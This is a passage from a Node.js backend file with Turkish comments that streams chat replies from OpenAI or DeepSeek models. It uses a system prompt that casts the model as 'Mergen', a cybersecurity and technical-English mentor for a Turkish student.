 * OpenAI ve uyumlu modeller (DeepSeek) ile sohbet yanıtını stream eder.
 */
async function streamChatOpenAIResponse(apiKey, messages, res, baseURL = null) {
    const openai = new OpenAI({
        apiKey: apiKey,
        ...(baseURL && { baseURL: baseURL })
    });
    
    const systemMessage = {
        role: 'system',
        content: `You are "Mergen", an expert Cybersecurity Mentor. Your student is from Turkey and is learning to improve their technical English and cybersecurity skills. 
        - Your tone must be professional, encouraging, and pedagogical. 
        - Explain complex topics with real-world examples.
        - You must primarily respond in the language the user uses. If they ask in Turkish, answer in Turkish. If they ask in English, answer in English.
        - You can ask follow-up questions to gauge their understanding.`
    };

    // OpenAI API'si, sistem mesajının en başta olmasını bekler.
    const apiMessages = [systemMessage, ...messages];
    const modelName = baseURL ? 'deepseek-chat' : 'gpt-4o-mini';

    const stream = await openai.chat.completions.create({
        model: modelName,
        messages: apiMessages,
        stream: true,
    });

    for await (const chunk of stream) {
        const content = chunk.choices[0]?.delta?.content || '';
        if (content) {
            res.write(content);
        }
    }
    res.end();
}

app.listen(PORT, () => {
    console.log(`Backend sunucusu http://localhost:${PORT} adresinde çalışıyor.`);
});